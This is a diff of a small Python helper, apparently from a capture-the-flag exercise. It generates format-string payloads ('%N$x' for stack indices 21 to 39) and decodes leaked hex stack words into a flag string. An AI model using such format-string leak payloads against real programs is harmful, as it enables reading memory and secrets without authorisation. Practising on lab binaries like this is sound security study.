@@ -6,16 +6,16 @@ lst = '9b983d0.804b000.80489c3.f7f8bd80.ffffffff.1.9b96160.f7f99110.f7f8bdc7.0.9
 
 # s = ''.join(a)
 
-# for i in range(17,27):
-#     x = '%'+str(i)+'$x'
-    # print(x, end='.') 
+for i in range(21,40):
+    x = '%'+str(i)+'$x'
+    print(x, end='.') 
 
-flag = '306c5f49.345f7435.6d5f6c6c.306d5f79.5f79336e.35343036.64303664.ffd5007d.f7f98af8.f7f6b440'
-
+# flag = '306c5f49.345f7435.6d5f6c6c.306d5f79.5f79336e.35343036.64303664.ffd5007d.f7f98af8.f7f6b440'
+flag = "37693e00.9afa1fd0.c6b33e08.9afa1f80.9afa2058.b6a9040.b6aa199.9afa2058.2da12141.1.0.c6d68000.b6acd90.2c812141.697f2141."
 a = flag.split('.')
 
 
 b = "".join(a)
-print(x*10)
+print(b)
 
 # print(s)    y = 
